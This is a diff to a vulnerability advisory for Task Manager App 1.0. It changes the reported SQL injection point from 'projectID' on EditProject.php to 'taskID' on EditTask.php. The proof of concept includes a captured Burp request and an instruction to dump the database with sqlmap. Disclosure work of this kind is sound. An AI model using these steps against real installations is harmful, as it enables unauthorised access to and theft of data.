@@ -9,7 +9,7 @@
 + **CVE:** Reported, waiting for CVE number.
 
 ## Description:
-Task Manager App 1.0 allows SQL Injection via the 'projectID' parameter at "/TaskManager/EditProject.php?edit=1&projectID=2". 
+Task Manager App 1.0 allows SQL Injection via the 'taskID' parameter at "/TaskManager/EditTask.php?edit=1&taskID=2". 
 Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.
 
 ## Proof of Concept:
@@ -20,13 +20,14 @@ Exploiting this issue could allow an attacker to compromise the application, acc
 + Copy the request and paste it into an "r.txt" file.
 + Captured Burp request:
 ```
-GET /TaskManager/EditProject.php?edit=1&projectID=2 HTTP/1.1
+GET /TaskManager/EditTask.php?edit=1&taskID=2 HTTP/1.1
 Host: localhost
 sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
 sec-ch-ua-mobile: ?0
 sec-ch-ua-platform: "Linux"
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
+
 ```
 + Use sqlmap to exploit. In sqlmap, use 'taskID' parameter to dump the database.
 ```
